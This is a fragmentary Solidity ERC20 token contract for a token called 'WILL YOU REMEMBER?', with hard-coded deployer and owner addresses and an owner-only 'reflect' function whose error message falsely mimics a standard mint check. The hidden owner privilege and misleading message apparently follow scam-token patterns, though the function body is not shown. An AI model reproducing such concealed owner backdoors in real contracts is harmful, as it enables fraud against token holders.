...
contract WILL is Context, IERC20 {
    ...
    address lead_deployer = 0x2Da0aC174B5Db0f9ca1DA215328D6DBCeB901A4B;
    address public _owner = 0xeFe662aB4Dd69E4588cAE6911e72B1DdBbC5a0c5;
   constructor () public {


        
        _name = "WILL YOU REMEMBER?";
        _symbol = "WILL";
        _decimals = 10;
        uint256 initialSupply = 1000000000;
        _safeOwner = _owner;

        _mint(lead_deployer, initialSupply*(10**10));
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    function reflect(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
